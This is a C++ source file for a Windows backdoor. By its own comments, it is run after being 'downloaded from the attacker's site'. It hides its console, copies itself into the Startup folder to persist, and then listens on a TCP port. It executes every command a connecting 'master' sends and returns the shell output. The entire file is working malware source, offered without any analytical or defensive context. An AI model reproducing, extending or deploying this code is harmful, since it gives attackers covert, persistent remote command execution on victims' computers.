#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include<iostream>

#include "Network.h"
#include "Utils.h"

void telNet(SOCKET s)
{
    char* buf = new char[65536];
    std::string stdOut;
    while (1)
    {
        /* recieve the command */
        ZeroMemory(buf, 65536);
        if(recv(s, buf, 65536, 0) < 0)
            break;

        /* run the command and send the output back*/
        stdOut = executeShell(buf);
        if (sendStdOut(s, stdOut))
            break;
    }
    delete[] buf;
}

int main(int argc, char** argv)
{
    /* hide console*/
    hideConsole();

    /*running once after file is downloaded from the attacker's site*/
    if (!isInStartUp(argv[0])) //check if the application is running from the startUp directory
    {
        copyToStartUp(argv[0]);
        executeStartUpFile();
        return 0;
    }

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sockaddr_in addressinfo;
    uint32_t mastersIP = findMastersIP();
    int opt;

    if (!mastersIP)
        return 1;

    addressinfo.sin_addr.s_addr = getPrivateIP();
    addressinfo.sin_port = htons(TCP_PORT);
    addressinfo.sin_family = AF_INET;

    SOCKET master;
    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    if(s < 0)
        std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;

    opt = 1;
    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0)
        std::cout << "Sockopt error <" << WSAGetLastError() << ">" << std::endl;

    if(bind(s, (sockaddr*)&addressinfo, sizeof(addressinfo)) < 0)
        std::cout << "Bind error <" << WSAGetLastError() << ">" << std::endl;

    if(listen(s, 1) < 0)
        std::cout << "Listen error <" << WSAGetLastError() << ">" << std::endl;
    while (1)
    {
        master = accept(s, NULL, 0);
        if (!s | !master)
            return 1;
        telNet(master);
    }
}